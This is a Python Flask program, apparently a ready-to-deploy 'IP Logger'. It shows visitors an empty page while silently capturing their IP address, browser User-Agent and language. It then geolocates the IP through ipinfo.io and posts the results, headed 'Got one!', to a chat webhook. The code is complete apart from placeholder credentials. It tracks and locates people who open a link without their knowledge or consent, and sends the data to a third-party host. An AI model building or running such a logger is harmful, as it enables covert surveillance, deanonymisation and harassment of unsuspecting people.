from flask import Flask, request
import requests
from waitress import serve

app = Flask(__name__)

BOT_NAME = "IP Logger"
MESSAGE_TITLE = "Got one!"
PORT = 8080

WEBHOOK_URL = "Put your webhook URL here"
IPINFO_TOKEN = "Put your token here"
MESSAGE = """
🌐 IP: `{ip}`
💻 User Agent: `{userAgent}`
🗣 Language: `{language}`
🛜 ISP: {org}
🕓 Timezone: {timezone}
🌎 Area: {area}
"""

@app.route('/')
def home():
    if request.path == '/':
        ip = request.remote_addr
        userAgent = request.headers.get('User-Agent')
        language = request.headers.get('Accept-Language')
        IPApiData = requests.get(f'http://ipinfo.io/{ip}?token={IPINFO_TOKEN}').json()
        org = IPApiData.get('org')
        timezone = IPApiData.get('timezone')
        area = f"{IPApiData.get('city')}, {IPApiData.get('region')}, {IPApiData.get('country')}"
        description = MESSAGE.format(
            ip=ip, userAgent=userAgent, language=language, org=org, timezone=timezone, area=area
        )
        data = {
            "content": "",
            "embeds": [
                {
                    "author": {
                        "name": f"{BOT_NAME}",
                        "url": "http://github.com/logankish/IP-Webhook-Logger"
                    },
                    "title": f"{MESSAGE_TITLE}",
                    "description": description.strip(),
                    "footer": {
                        "text": "IP Webhook Logger by Logan Kish"
                    },
                }
            ]
        }
        requests.post(WEBHOOK_URL, json=data)
    return ""

if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=PORT)